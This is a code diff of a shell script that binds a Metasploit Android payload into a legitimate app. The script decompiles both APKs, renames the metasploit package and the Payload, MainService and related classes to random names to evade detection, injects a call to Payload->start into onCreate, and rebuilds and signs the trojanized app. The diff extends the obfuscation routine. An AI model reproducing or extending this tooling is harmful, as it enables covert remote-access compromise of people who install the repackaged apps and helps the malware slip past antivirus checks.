@@ -18,30 +18,52 @@ rand_name(){
 
 obfuscate(){
 	if [ "$1" == "" ]; then
+	new_mainact=$(rand_name)
+	new_payload=$(rand_name)
+	new_mainbroad=$(rand_name)
+	new_mainserv=$(rand_name)
 	new_met=$(rand_name)
 	new_stage=$(rand_name)
 	mv original/smali/com/metasploit original/smali/com/$new_met
 	mv original/smali/com/$new_met/stage original/smali/com/$new_met/$new_stage
 	return
 fi
-for i in $1/*
+if [ ! -z $2 ]; then
+		fn=$2
+fi
+for i in $1/*	
         do
-                sed -i 's/metasploit/'$new_met'/g' $i
-                sed -i 's/stage/'$new_stage'/g' $i
                 if [ -d $i ]; then
                         obfuscate $i
+                        return
                 fi
+                sed -i 's/metasploit/'$new_met'/g' $i
+                sed -i 's/stage/'$new_stage'/g' $i                
+                declare -A smalis=( [MainActivity]=$new_mainact [MainBroadcastReceiver]=$new_mainbroad [MainService]=$new_mainserv [Payload]=$new_payload )
+                for j in MainActivity MainBroadcastReceiver MainService Payload; do
+                        key=$(echo ${smalis[$j]})
+                if [ -z $fn ]; then                        
+                        [ -z "$(cat $i | grep -i $j)" ] || {
+                                sed -i 's/'$j'/'$key'/g' $i
+                        }
+                else
+                if [ $(basename $i | sed 's/\..*//') == $j ]; then
+                        mv $i $1/$key.smali
+                        continue
+                fi
+                fi
+done
 done
 }
 
 cleanup(){
-	echo "+ Cleaning Up"
+	echo -n "+ Cleaning Up"
 	for i in activity file smaliloc.tmp smalifiles; do
 		[ ! -f $i ] || rm $i
 	done
 	rm -rf original/
 	rm -rf payload/
-	echo "+ Done"
+	echo " ==> Done"
 }
 
 manifest(){
@@ -193,8 +215,9 @@ fi
 			sed -i ''$ln'd' $x
 			msg="Something Went Wrong, Re-Injecting Hook Into $x"
 		fi
-		echo "+ $msg"
+		echo -n "+ $msg"
         	 sed -i '/->onCreate(Landroid\/os\/Bundle;)V/a \    invoke-static {'$hook'}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $x
+        	 echo " ==> Done"
 else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
 	cleanup
 	exit 1
@@ -202,7 +225,7 @@ else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
 }
 
 manual_hook(){
-	echo "++ Looking For Injectable Smali Files"
+	echo "+++ Looking For Injectable Smali Files"
 	ls original  | grep smali > smali_folders
 	while read -r folder || [[ -n $folder ]]; do
 	#pkg_name=$(cat original/AndroidManifest.xml | grep -w package | sed 's/.*package="//' | sed 's/\".*//')
@@ -218,19 +241,21 @@ manual_hook(){
 }
 
 sign(){
-echo "+ Building Original Apk"
+echo -n "+ Building Original Apk"
  ./bin/apktool b original/ >> $logfile 2>&1
 
 	if [ "$?" != "0" ]; then
 		excode=1
 		return 1
 	fi
-echo "+ Signing Original Apk"
+	echo " ==> Done"
+echo -n "+ Signing Original Apk"
 jarsigner -verbose -keystore ./bin/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/*.apk androiddebugkey >>$logfile
 	if ! [ -d $(pwd)/output ]; then
 		mkdir $(pwd)/output
 	fi
 cp original/dist/*.apk output/
+echo " ==> Done"
 cleanup
 }
 
@@ -239,17 +264,20 @@ cp_payload(){
 	echo -n "+ Obfuscating Smali Files"
 	obfuscate
 	obfuscate original/smali/com/$new_met/$new_stage
-	echo "==> I Tried My Best"
+	echo " ==> I Tried My Best"
+	obfuscate original/smali/com/$new_met/$new_stage
 	manifest
 }
 
 decompile(){
-	echo "+ Decompiling Original Apk"
+	echo -n "+ Decompiling Original Apk"
 	./bin/apktool empty-framework-dir --force >> $logfile 2>&1
 	./bin/apktool d -f -o original $1 >> $logfile 2>&1
+	echo " ==> Done"
 	shift
-	echo "+ Decompiling Payload"
+	echo -n "+ Decompiling Payload"
 	./bin/apktool d -f -o payload $1 >> $logfile 2>&1
+	echo " ==> Done"
 	cp_payload
 }
 
